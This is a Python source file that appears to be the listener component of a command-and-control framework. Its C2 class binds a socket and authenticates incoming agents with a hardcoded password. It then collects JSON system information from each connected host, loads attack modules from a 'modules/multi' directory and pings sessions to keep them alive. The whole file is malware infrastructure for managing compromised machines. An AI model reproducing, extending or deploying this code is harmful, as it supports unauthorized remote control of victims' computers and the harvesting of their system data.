import socket
import sys, os, time
import json
from lib.helper import *
from lib.debug import Debug
from lib.dmos import Dmos
from hashlib import md5

class C2():
    def __init__(self, ANODE, APORT, multi_handler):
        self.multi_handler = multi_handler
        self.ANODE = ANODE
        self.APORT = APORT
        self.PASS  = "pontifex"
        self.modules_multi = self.load_modules("modules/multi")
        self.interactive = False
        self.keepAliveSleepInterval = 5
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    def load_modules(self, path):
        sys.path.append(path)
        modules = {}
        for mod in os.listdir(path):
            if mod == '__init__.py' or mod[-3:] != '.py':
                continue
            else:
                m = __import__(mod[:-3]).module()
                modules[m.Command] = m
        return modules

    @safe_exec
    def listener(self):
        self.s.bind((self.ANODE, self.APORT))
        self.s.listen(5)

    def accept_conn(self):
        conn, address = self.s.accept()
        if conn.recv(36).decode() == self.PASS:
            intel = conn.recv(1024).decode()

            intel = json.loads(intel)
                #print(intel)
            return Dmos(intel["basic"], intel["sysinfo"], address[0], conn, self)

    @safe_exec
    def keepAlive(self):
        while 1:
            time.sleep(self.keepAliveSleepInterval)
            for d, hash in enumerate(self.multi_handler.dmoss.copy()):
                try:
                    self.multi_handler.dmoss[hash].conn.send(b" ")
                except:
                    terminate(self.multi_handler.dmoss, self, signal="error")
